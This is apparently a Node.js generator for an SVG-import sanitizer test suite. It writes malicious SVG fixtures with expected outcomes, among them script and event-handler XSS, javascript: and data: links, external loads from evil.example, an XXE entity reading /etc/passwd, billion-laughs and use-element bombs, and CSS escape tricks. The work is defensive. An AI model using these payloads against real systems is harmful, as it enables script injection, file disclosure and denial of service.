// Sinh bộ SVG độc hại tests/fixtures/svg-import/malicious/ (feature 008, T035; contract §8, R19).
// Tất định: chạy lại cho ra đúng byte như đã commit. Chạy: node tools/svg-fixtures/make-malicious.mjs [--check]
//
// Lược đồ <id>.expect.json (harness T051 đọc):
//   id, title            chuỗi
//   outcome              "sanitized" | "rejected"
//   codes                mã phải XUẤT HIỆN: sanitized -> trong removed[].code, converted[].code hoặc warnings[].code;
//                        rejected -> mã lỗi (E_IMPORT_*) của ImportResult.errors[].code
//   forbid               chuỗi con (không phân biệt hoa thường) KHÔNG được có trong result.svg đã nhập
//   keep                 (tùy chọn) chuỗi con PHẢI còn trong result.svg
//   rawCanary            (tùy chọn) true: bản gốc, dựng không lọc, được kỳ vọng đặt window.__pwned
//   generated            (tùy chọn) { module, case }: ca quá lớn nên không có file .svg; harness gọi
//                        module (limits.mjs) để sinh nội dung lúc chạy
import { mkdirSync, readFileSync, writeFileSync, existsSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

const here = dirname(fileURLToPath(import.meta.url));
const outDir = join(here, '..', '..', 'tests', 'fixtures', 'svg-import', 'malicious');

const NS = 'xmlns="http://www.w3.org/2000/svg"';
const XL = 'xmlns:xlink="http://www.w3.org/1999/xlink"';
const wrap = (body, extra = '') =>
  `<svg ${NS} ${XL} ${extra} width="200" height="100" viewBox="0 0 200 100">\n${body}\n</svg>\n`;
const rect = '<rect x="10" y="10" width="80" height="40" fill="#3aa655"/>';
const svgDataB64 = Buffer.from(
  '<svg xmlns="http://www.w3.org/2000/svg"><script>window.__pwned="m23"</script></svg>',
).toString('base64');

// m17: 10 cấp, mỗi cấp 10 `use` của cấp trước -> 10^10 phần tử hiệu dụng.
function useBomb() {
  let s = '<defs>\n<g id="l0"><rect width="1" height="1"/></g>\n';
  for (let i = 1; i < 10; i++) {
    s += `<g id="l${i}">${Array.from({ length: 10 }, () => `<use href="#l${i - 1}"/>`).join('')}</g>\n`;
  }
  return wrap(`${s}</defs>\n<use href="#l9"/>`);
}

/** @type {Array<{id:string,title:string,outcome:string,codes:string[],forbid:string[],keep?:string[],rawCanary?:boolean,generated?:{module:string,case:string},content?:string|Buffer}>} */
export const CASES = [
  {
    id: 'm01-script',
    title: '<script> ở gốc và trong <defs>',
    outcome: 'sanitized',
    codes: ['R_SCRIPT'],
    forbid: ['<script', '__pwned'],
    rawCanary: true,
    content: wrap(
      `<defs><script>window.__pwned="m01-defs"</script></defs>\n${rect}\n<script>window.__pwned="m01"</script>`,
    ),
  },
  {
    id: 'm02-script-case',
    title: '<SCRIPT>, <sCrIpT> (XML phân biệt hoa thường)',
    outcome: 'sanitized',
    codes: ['R_ELEMENT_NOT_ALLOWED'],
    forbid: ['<script', '__pwned'],
    content: wrap(
      `${rect}\n<SCRIPT>window.__pwned="m02a"</SCRIPT>\n<sCrIpT>window.__pwned="m02b"</sCrIpT>`,
    ),
  },
  {
    id: 'm03-onload-svg',
    title: 'onload trên <svg>',
    outcome: 'sanitized',
    codes: ['R_EVENT_ATTR'],
    forbid: ['onload', '__pwned'],
    rawCanary: true,
    content: `<svg ${NS} onload="window.__pwned='m03'" width="200" height="100" viewBox="0 0 200 100">\n${rect}\n</svg>\n`,
  },
  {
    id: 'm04-event-attrs',
    title: 'onclick, onmouseover, onfocus, onbegin trên hình',
    outcome: 'sanitized',
    codes: ['R_EVENT_ATTR'],
    forbid: ['onclick', 'onmouseover', 'onfocus', 'onbegin', '__pwned'],
    content: wrap(
      `<rect x="10" y="10" width="40" height="40" onclick="window.__pwned='m04a'"/>\n<circle cx="100" cy="30" r="20" onmouseover="window.__pwned='m04b'"/>\n<rect x="140" y="10" width="40" height="40" onfocus="window.__pwned='m04c'" tabindex="0"/>\n<g onbegin="window.__pwned='m04d'"><path d="M0 0L10 10"/></g>`,
    ),
  },
  {
    id: 'm05-a-javascript',
    title: '<a href="javascript:…"> và xlink:href; <a> được mở vỏ',
    outcome: 'sanitized',
    codes: ['R_HREF_EXTERNAL'],
    forbid: ['javascript:', '<a ', '__pwned'],
    keep: ['<rect'],
    content: wrap(
      `<a href="javascript:window.__pwned='m05a'">${rect}</a>\n<a xlink:href="javascript:window.__pwned='m05b'"><circle cx="150" cy="30" r="20"/></a>`,
    ),
  },
  {
    id: 'm06-use-javascript',
    title: '<use href="javascript:…">',
    outcome: 'sanitized',
    codes: ['R_HREF_EXTERNAL'],
    forbid: ['javascript:', '__pwned'],
    content: wrap(
      `${rect}\n<use href="javascript:window.__pwned='m06'"/>\n<use xlink:href="javascript:window.__pwned='m06b'"/>`,
    ),
  },
  {
    id: 'm07-image-http',
    title: '<image href="http://…">',
    outcome: 'sanitized',
    codes: ['R_IMAGE_LINKED'],
    forbid: ['http://evil', 'https://evil'],
    content: wrap(
      `<image href="http://evil.example/track.png" x="0" y="0" width="50" height="50"/>\n<image xlink:href="https://evil.example/t2.png" x="60" y="0" width="50" height="50"/>`,
    ),
  },
  {
    id: 'm08-use-external',
    title: '<use href="http://evil/x.svg#a">',
    outcome: 'sanitized',
    codes: ['R_HREF_EXTERNAL'],
    forbid: ['evil.example'],
    content: wrap(`${rect}\n<use href="http://evil.example/x.svg#a"/>\n<use href="x.svg#a"/>`),
  },
  {
    id: 'm09-foreignobject-iframe',
    title: '<foreignObject><iframe src=…>',
    outcome: 'sanitized',
    codes: ['R_FOREIGN'],
    forbid: ['foreignobject', 'iframe', 'evil.example'],
    content: wrap(
      `${rect}\n<foreignObject x="0" y="0" width="200" height="100"><iframe xmlns="http://www.w3.org/1999/xhtml" src="http://evil.example/"></iframe></foreignObject>`,
    ),
  },
  {
    id: 'm10-foreignobject-body',
    title: '<foreignObject><body onload>',
    outcome: 'sanitized',
    codes: ['R_FOREIGN'],
    forbid: ['foreignobject', '<body', 'onload', '__pwned'],
    content: wrap(
      `${rect}\n<foreignObject x="0" y="0" width="200" height="100"><body xmlns="http://www.w3.org/1999/xhtml" onload="window.__pwned='m10'">x</body></foreignObject>`,
    ),
  },
  {
    id: 'm11-style-import',
    title: '<style>@import url(http://…)</style>',
    outcome: 'sanitized',
    codes: ['R_CSS_AT'],
    forbid: ['@import', 'evil.example', '<style'],
    content: wrap(
      `<style>@import url(http://evil.example/x.css);\n.a{fill:#c00}</style>\n<rect class="a" x="10" y="10" width="80" height="40"/>`,
    ),
  },
  {
    id: 'm12-style-url-external',
    title: 'style="fill:url(javascript:…)" và fill:url(http://…)',
    outcome: 'sanitized',
    codes: ['R_URL_EXTERNAL'],
    forbid: ['javascript:', 'evil.example'],
    content: wrap(
      `<rect x="10" y="10" width="80" height="40" style="fill:url(javascript:window.__pwned='m12a')"/>\n<rect x="100" y="10" width="80" height="40" style="fill:url(http://evil.example/p.svg#f)"/>`,
    ),
  },
  {
    id: 'm13-css-expression',
    title: 'expression(…), behavior:, -moz-binding',
    outcome: 'sanitized',
    codes: ['R_CSS_PROP'],
    forbid: ['expression', 'behavior', '-moz-binding', '__pwned'],
    content: wrap(
      `<rect x="10" y="10" width="80" height="40" style="width:expression(window.__pwned='m13a');behavior:url(x.htc);-moz-binding:url(http://evil.example/x.xml#b);fill:#3aa655"/>`,
    ),
  },
  {
    id: 'm14-dtd-billion-laughs',
    title: 'DOCTYPE "billion laughs"',
    outcome: 'rejected',
    codes: ['E_IMPORT_DTD'],
    forbid: [],
    content: `<?xml version="1.0"?>
<!DOCTYPE svg [
<!ENTITY lol "lol">
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<svg ${NS} width="200" height="100" viewBox="0 0 200 100"><text x="10" y="50">&lol9;</text></svg>
`,
  },
  {
    id: 'm15-dtd-entity-system',
    title: 'DOCTYPE <!ENTITY x SYSTEM "file:///etc/passwd">',
    outcome: 'rejected',
    codes: ['E_IMPORT_DTD'],
    forbid: [],
    content: `<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<svg ${NS} width="200" height="100" viewBox="0 0 200 100"><text x="10" y="50">&x;</text></svg>
`,
  },
  {
    id: 'm16-dtd-param-entity',
    title: 'DOCTYPE thực thể tham số <!ENTITY % p …>',
    outcome: 'rejected',
    codes: ['E_IMPORT_DTD'],
    forbid: [],
    content: `<?xml version="1.0"?>
<!DOCTYPE svg [
<!ENTITY % p SYSTEM "http://evil.example/p.dtd">
%p;
]>
<svg ${NS} width="200" height="100" viewBox="0 0 200 100"><rect x="10" y="10" width="80" height="40"/></svg>
`,
  },
  {
    id: 'm17-use-bomb',
    title: '`use` lồng 10 cấp x 10 lần (10^10 phần tử hiệu dụng)',
    outcome: 'rejected',
    codes: ['E_IMPORT_USE_BOMB'],
    forbid: [],
    content: useBomb(),
  },
  {
    id: 'm18-use-cycle',
    title: '`use` trỏ vào chính tổ tiên (vòng)',
    outcome: 'rejected',
    codes: ['E_IMPORT_USE_BOMB'],
    forbid: [],
    content: wrap(`<g id="a"><rect x="10" y="10" width="20" height="20"/><use href="#a"/></g>`),
  },
  {
    id: 'm19-smil-animate-href',
    title: '<animate attributeName="href" values="javascript:…">',
    outcome: 'sanitized',
    codes: ['R_SMIL'],
    forbid: ['<animate', 'javascript:', '__pwned'],
    content: wrap(
      `<a href="#x"><rect x="10" y="10" width="80" height="40"><animate attributeName="href" values="javascript:window.__pwned='m19'" begin="0s" dur="1s"/></rect></a>`,
    ),
  },
  {
    id: 'm20-smil-set-href',
    title: '<set attributeName="xlink:href" to="javascript:…">',
    outcome: 'sanitized',
    codes: ['R_SMIL'],
    forbid: ['<set', 'javascript:', '__pwned'],
    content: wrap(
      `<a href="#x"><rect x="10" y="10" width="80" height="40"><set attributeName="xlink:href" to="javascript:window.__pwned='m20'" begin="0s"/></rect></a>`,
    ),
  },
  {
    id: 'm21-html-script-ns',
    title: '<html:script xmlns:html="http://www.w3.org/1999/xhtml">',
    outcome: 'sanitized',
    codes: ['R_NAMESPACE'],
    forbid: ['script', 'xhtml', '__pwned'],
    content: wrap(
      `${rect}\n<html:script xmlns:html="http://www.w3.org/1999/xhtml">window.__pwned="m21"</html:script>`,
    ),
  },
  {
    id: 'm22-xml-stylesheet-pi',
    title: '<?xml-stylesheet href="http://evil/x.css"?>',
    outcome: 'sanitized',
    codes: ['R_PI'],
    forbid: ['xml-stylesheet', 'evil.example'],
    content: `<?xml version="1.0"?>\n<?xml-stylesheet href="http://evil.example/x.css" type="text/css"?>\n${wrap(rect)}`,
  },
  {
    id: 'm23-image-data-svg',
    title: '<image href="data:image/svg+xml;base64,…<script>…">',
    outcome: 'sanitized',
    codes: ['R_IMAGE_BAD'],
    forbid: ['data:image/svg', '__pwned'],
    content: wrap(
      `<image href="data:image/svg+xml;base64,${svgDataB64}" x="0" y="0" width="100" height="100"/>`,
    ),
  },
  {
    id: 'm24-a-data-html',
    title: '<a href="data:text/html,<script>…">',
    outcome: 'sanitized',
    codes: ['R_HREF_EXTERNAL'],
    forbid: ['data:text/html', '<script', '__pwned'],
    content: wrap(
      `<a href="data:text/html,&lt;script&gt;window.__pwned='m24'&lt;/script&gt;">${rect}</a>`,
    ),
  },
  {
    id: 'm25-feimage-blur-huge',
    title: '<feImage href="http://…"> và stdDeviation="1e9"',
    outcome: 'sanitized',
    codes: ['R_FILTER_HEAVY'],
    forbid: ['feimage', 'evil.example', '1e9'],
    content: wrap(
      `<defs><filter id="f1"><feImage href="http://evil.example/i.png"/><feGaussianBlur stdDeviation="1e9"/></filter></defs>\n<rect x="10" y="10" width="80" height="40" filter="url(#f1)"/>`,
    ),
  },
  {
    id: 'm26-misc-elements',
    title:
      'link, meta refresh, base, audio, video, canvas, embed, object, iframe (namespace SVG và XHTML)',
    outcome: 'sanitized',
    codes: ['R_ELEMENT_NOT_ALLOWED', 'R_NAMESPACE'],
    forbid: [
      '<link',
      '<meta',
      '<base',
      '<audio',
      '<video',
      '<canvas',
      '<embed',
      '<object',
      '<iframe',
      'refresh',
      'evil.example',
    ],
    content: wrap(
      [
        rect,
        '<link href="http://evil.example/a.css" rel="stylesheet"/>',
        '<meta http-equiv="refresh" content="0;url=http://evil.example/"/>',
        '<base href="http://evil.example/"/>',
        '<audio src="http://evil.example/a.mp3"/>',
        '<video src="http://evil.example/v.mp4"/>',
        '<canvas width="10" height="10"/>',
        '<embed src="http://evil.example/e.swf"/>',
        '<object data="http://evil.example/o.svg"/>',
        '<iframe src="http://evil.example/"/>',
        '<h:link xmlns:h="http://www.w3.org/1999/xhtml" href="http://evil.example/a.css"/>',
        '<h:meta xmlns:h="http://www.w3.org/1999/xhtml" http-equiv="refresh" content="0;url=http://evil.example/"/>',
        '<h:base xmlns:h="http://www.w3.org/1999/xhtml" href="http://evil.example/"/>',
        '<h:audio xmlns:h="http://www.w3.org/1999/xhtml" src="http://evil.example/a.mp3"/>',
        '<h:video xmlns:h="http://www.w3.org/1999/xhtml" src="http://evil.example/v.mp4"/>',
        '<h:canvas xmlns:h="http://www.w3.org/1999/xhtml"/>',
        '<h:embed xmlns:h="http://www.w3.org/1999/xhtml" src="http://evil.example/e.swf"/>',
        '<h:object xmlns:h="http://www.w3.org/1999/xhtml" data="http://evil.example/o.svg"/>',
        '<h:iframe xmlns:h="http://www.w3.org/1999/xhtml" src="http://evil.example/"/>',
      ].join('\n'),
    ),
  },
  {
    id: 'm27-style-cdata-breakout',
    title: '<style><![CDATA[</style><script>…]]></style>',
    outcome: 'sanitized',
    codes: [],
    forbid: ['<script', '<style', '__pwned'],
    content: wrap(
      `<style><![CDATA[</style><script>window.__pwned="m27"</script>.a{fill:#c00}]]></style>\n<rect class="a" x="10" y="10" width="80" height="40"/>`,
    ),
  },
  {
    id: 'm28-fake-uid',
    title: 'data-mat-uid giả: trùng UID của project và trùng giữa hai phần tử',
    outcome: 'sanitized',
    codes: ['R_DATA_ATTR'],
    forbid: ['el_victim12345', 'el_dupdup0001'],
    content: wrap(
      `<rect data-mat-uid="el_victim12345" x="10" y="10" width="40" height="40"/>\n<rect data-mat-uid="el_dupdup0001" x="60" y="10" width="40" height="40"/>\n<circle data-mat-uid="el_dupdup0001" cx="150" cy="30" r="20"/>`,
    ),
  },
  {
    id: 'm29-size-6mib',
    title: 'File 6 MiB (sinh lúc chạy bởi limits.mjs, không commit)',
    outcome: 'rejected',
    codes: ['E_IMPORT_LIMIT'],
    forbid: [],
    generated: { module: '../limits.mjs', case: 'bytes-6mib' },
  },
  {
    id: 'm30a-depth-100',
    title: 'Độ sâu 100 (sinh lúc chạy)',
    outcome: 'rejected',
    codes: ['E_IMPORT_LIMIT'],
    forbid: [],
    generated: { module: '../limits.mjs', case: 'depth-100' },
  },
  {
    id: 'm30b-elements-200000',
    title: '200.000 phần tử thô (sinh lúc chạy)',
    outcome: 'rejected',
    codes: ['E_IMPORT_LIMIT'],
    forbid: [],
    generated: { module: '../limits.mjs', case: 'raw-200000' },
  },
  {
    id: 'm31-utf16',
    title: 'Tệp UTF-16 LE có BOM',
    outcome: 'rejected',
    codes: ['E_IMPORT_ENCODING'],
    forbid: [],
    content: Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from(wrap(rect), 'utf16le')]),
  },
  {
    id: 'm32-utf8-invalid',
    title: 'UTF-8 hỏng (byte 0xC3 0x28)',
    outcome: 'rejected',
    codes: ['E_IMPORT_ENCODING'],
    forbid: [],
    content: Buffer.concat([
      Buffer.from(
        '<?xml version="1.0" encoding="UTF-8"?>\n<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 100"><text x="10" y="50">',
      ),
      Buffer.from([0xc3, 0x28, 0xff, 0xfe]),
      Buffer.from('</text></svg>\n'),
    ]),
  },
  {
    id: 'm33-text-escaped-script',
    title: '<text>&lt;script&gt;alert(1)&lt;/script&gt;</text>: giữ chữ, không thành phần tử',
    outcome: 'sanitized',
    codes: [],
    forbid: ['<script'],
    keep: ['alert(1)'],
    content: wrap(`<text x="10" y="50">&lt;script&gt;alert(1)&lt;/script&gt;</text>`),
  },
  {
    id: 'm34-href-prefix',
    title: 'x:href (x = xlink) chuẩn hóa; y:href (y = namespace lạ) bị bỏ',
    outcome: 'sanitized',
    codes: ['C_XLINK', 'R_ATTR_NOT_ALLOWED'],
    forbid: ['y:href', 'evil.example', 'javascript:'],
    keep: ['#tgt'],
    content: `<svg ${NS} xmlns:x="http://www.w3.org/1999/xlink" xmlns:y="http://evil.example/ns" width="200" height="100" viewBox="0 0 200 100">
<defs><rect id="tgt" width="20" height="20"/></defs>
<use x:href="#tgt" x="10" y="10"/>
<use y:href="javascript:window.__pwned='m34'" x="60" y="10"/>
</svg>
`,
  },
  {
    id: 'm35-css-escape',
    title: 'CSS thoát ký tự: url(\\6a avascript:…) và \\000065xpression',
    outcome: 'sanitized',
    codes: ['R_URL_EXTERNAL'],
    forbid: ['javascript', 'avascript', '__pwned'],
    content: wrap(
      `<rect x="10" y="10" width="80" height="40" style="fill:url(\\6a avascript:window.__pwned='m35')"/>\n<rect x="100" y="10" width="80" height="40" style="fill:u\\72l(&quot;javascript:window.__pwned='m35b'&quot;)"/>`,
    ),
  },
  {
    id: 'm36-image-file',
    title: '<image href="file:///C:/Users/x/a.png"> (ảnh liên kết cục bộ)',
    outcome: 'sanitized',
    codes: ['R_IMAGE_LINKED'],
    forbid: ['file:', 'C:/Users'],
    content: wrap(
      `<image href="file:///C:/Users/x/a.png" x="0" y="0" width="50" height="50"/>\n${rect}`,
    ),
  },
  {
    id: 'm37-filter-url-external',
    title: 'filter="url(http://…)", fill="url(//evil/…)", marker-end="url(data:…)"',
    outcome: 'sanitized',
    codes: ['R_URL_EXTERNAL'],
    forbid: ['evil.example', 'url(data:'],
    content: wrap(
      `<rect x="10" y="10" width="40" height="40" filter="url(http://evil.example/f.svg#f)"/>\n<rect x="60" y="10" width="40" height="40" fill="url(//evil.example/p.svg#p)"/>\n<path d="M110 10L190 50" stroke="#000" marker-end="url(data:image/svg+xml;base64,AAAA#m)"/>`,
    ),
  },
  {
    id: 'm38-textpath-external',
    title: '<textPath href="http://…"> và xlink:href với đường dẫn tương đối',
    outcome: 'sanitized',
    codes: ['R_HREF_EXTERNAL'],
    forbid: ['evil.example', 'other.svg'],
    content: wrap(
      `<text x="10" y="50"><textPath href="http://evil.example/p.svg#p">chữ</textPath></text>\n<text x="10" y="80"><textPath xlink:href="other.svg#p">chữ 2</textPath></text>`,
    ),
  },
];

function write(file, content, check, state) {
  if (check) {
    const same = existsSync(file) && Buffer.compare(readFileSync(file), Buffer.from(content)) === 0;
    if (!same) state.bad++;
    return;
  }
  writeFileSync(file, content);
}

export function expectJson(c) {
  const e = { id: c.id, title: c.title, outcome: c.outcome, codes: c.codes, forbid: c.forbid };
  if (c.keep) e.keep = c.keep;
  if (c.rawCanary) e.rawCanary = true;
  if (c.generated) e.generated = c.generated;
  return JSON.stringify(e, null, 2) + '\n';
}

if (process.argv[1] && fileURLToPath(import.meta.url) === process.argv[1]) {
  const check = process.argv.includes('--check');
  const state = { bad: 0 };
  if (!check) mkdirSync(outDir, { recursive: true });
  for (const c of CASES) {
    if (c.content !== undefined) write(join(outDir, `${c.id}.svg`), c.content, check, state);
    write(join(outDir, `${c.id}.expect.json`), expectJson(c), check, state);
  }
  console.log(
    `${check ? 'kiểm' : 'ghi'} ${CASES.length} ca (${CASES.filter((c) => c.generated).length} sinh lúc chạy)`,
  );
  if (state.bad > 0) {
    console.error(`${state.bad} tệp lệch`);
    process.exit(1);
  }
}
